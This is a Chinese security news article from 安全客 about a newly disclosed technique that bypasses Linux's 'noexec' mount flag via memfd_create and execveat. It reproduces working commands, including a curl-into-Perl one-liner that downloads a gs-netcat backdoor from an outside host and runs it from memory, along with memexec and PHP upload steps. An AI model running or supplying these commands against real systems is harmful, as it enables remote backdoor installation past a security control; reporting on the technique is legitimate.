---
title: Linux系统安全告急：新技术绕过“noexec”，任意代码执行风险激增
url: https://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649787042&idx=1&sn=9ff9664f254d1077000edf4df5aeb18b&chksm=8893bacdbfe433dbddfdff5e5b5ff909029b141c9c1b7ddb9543066891e251c28569991008e3&scene=58&subscene=0#rd
source: 安全客
date: 2024-10-17
fetch_date: 2025-10-06T18:51:47.582788
---

# Linux系统安全告急：新技术绕过“noexec”，任意代码执行风险激增

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Ok4fxxCpBb5qs5TXnKpQQFibbvJWWqciaFt4pquMArXjQANH6ibjb7hJ0JeGJickxuLfEHoBHgyFaqlR4jvsNkd8ag/0?wx_fmt=jpeg)

# Linux系统安全告急：新技术绕过“noexec”，任意代码执行风险激增

安全客

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Ok4fxxCpBb5qs5TXnKpQQFibbvJWWqciaF3oM7atQnRPFyHGSY3CALnsvXk6SkRvdeqep4nPN68tHNy33wlTKMhw/640?wx_fmt=other&from=appmsg)

安全研究人员近日披露了一种全新的技术，**攻击者可以利用该技术绕过Linux系统中的“noexec”标志**，甚至在配置了此标志以防止执行恶意代码的分区上，也能执行恶意代码。

“noexec”标志是Linux中的一个关键安全措施，旨在防止在特定分区上执行二进制文件，如/tmp或/dev/shm。这一限制设计用于阻止攻击者上传并在这些常被攻击的区域执行恶意软件。然而，最新发现的方法巧妙地结合了Perl、Bash和PHP脚本，成功绕过了这一保护机制。

这一技术尤其令人担忧的是，它能够在启用了“noexec”的分区上执行直接从互联网下载的二进制文件。其原理是利用系统调用（如memfd\_create和execveat）将shellcode注入到运行中的进程中，并从内存中加载二进制文件。而且，该方法不需要root权限，这使得更多潜在攻击者能够利用它。

研究人员通过演示展示了该技术的有效性，常见的命令如id在没有root权限的情况下也能在启用了“noexec”的分区上执行。更令人警惕的是，他们展示了攻击者如何利用这种方法，通过简单的命令从远程服务器下载并执行恶意代码。

一个Perl示例展示了如何在没有root权限的情况下执行id命令：

```
source memexec-perl.shcat /usr/bin/id | memexec -u
```

Bash中同样可以实现类似的操作：

```
source memexec-bash.shcat /usr/bin/id | memexec
```

对有经验的读者来说，这通常意味着可以将来自互联网的后门直接导入内存，即便在“noexec”分区上禁止执行：

```
curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-x86_64 | GS_ARGS="-ilDq -s ChangeMe" perl '-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV' -- "$@"
```

该方法通过类似的脚本有效绕过了PHP中的命令执行限制，这对于依赖此类限制来防范恶意代码的系统而言，构成了一个重大的安全漏洞。

```
Upload memexec.php and egg (your backdoor) onto the targetCall curl -SsfL https://target/memexec.php will execute egg
```

研究人员仍在继续分析这一技术及其对Linux系统安全的潜在影响，强调需要实施额外的安全防护措施，以防止这种方法在实际攻击中被利用。研究人员还建议应监控对系统调用的访问并限制其使用，特别是在安全需求较高的环境中。

文章来源：

https://securityonline.info/linux-systems-vulnerable-to-new-noexec-bypass-technique-arbitrary-code-execution-now-possible/

**推荐阅读**

|  |
| --- |
| **01**  ｜[学校遭国家级黑客与勒索团伙的双重网络威胁](http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649787034&idx=1&sn=601d3128dda5bfa5e68dd68383a041e6&chksm=8893baf5bfe433e3ec3f75a4834085c3e9714c020268cd733fcb4f2de2390a547ffe654f9133&scene=21#wechat_redirect) |
| \_ |

|  |
| --- |
| **02**  ｜[全球资产管理巨头富达投资数据泄露](http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649787018&idx=1&sn=b72e450d8e3ce822c45ac404d55c09c0&chksm=8893bae5bfe433f3607adef80ddb4a56e18862f1836c8772208a5b19b12dabb29b927a067013&scene=21#wechat_redirect) |
| \_ |

|  |
| --- |
| **03**  ｜[Lua恶意软件攻击瞄准教育行业和游戏社区](http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649787006&idx=1&sn=6a1294633f133c80bcae983dec1e194c&chksm=8893ba11bfe433072580939410d1f220f03f97f3ce0bc4baa344c1e5ad825a49f74dd40f9806&scene=21#wechat_redirect) |
| \_ |

**安全KER**

安全KER致力于搭建国内安全人才学习、工具、淘金、资讯一体化开放平台，推动数字安全社区文化的普及推广与人才生态的链接融合。目前，安全KER已整合全国数千位白帽资源，联合南京、北京、广州、深圳、长沙、上海、郑州等十余座城市，与ISC、XCon、看雪SDC、Hacking Group等数个中大型品牌达成合作。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ok4fxxCpBb5qs5TXnKpQQFibbvJWWqciaF3aew57rSKWRJ4pyvJak3OKGBlT7k28aYu0j4WkdjXibATibJicTbibekMQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ok4fxxCpBb5qs5TXnKpQQFibbvJWWqciaFBdvPK8k3GyEUZBtVbicZKaOCl0ffW6gF8Jibt184xlfiav6hX5Ka5mtPA/640?wx_fmt=png&from=appmsg)

**注册安全KER社区**

**链接最新“圈子”动**

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/Ok4fxxCpBb7PGibphJ1WF3d1yIRaNsuRas4r2SWiaKK9yAoKpicYWBaibyGcHNiaEbrDauSywRrvcn4UFEkZvEo3S6Q/0?wx_fmt=png)

安全客

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/Ok4fxxCpBb7PGibphJ1WF3d1yIRaNsuRas4r2SWiaKK9yAoKpicYWBaibyGcHNiaEbrDauSywRrvcn4UFEkZvEo3S6Q/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过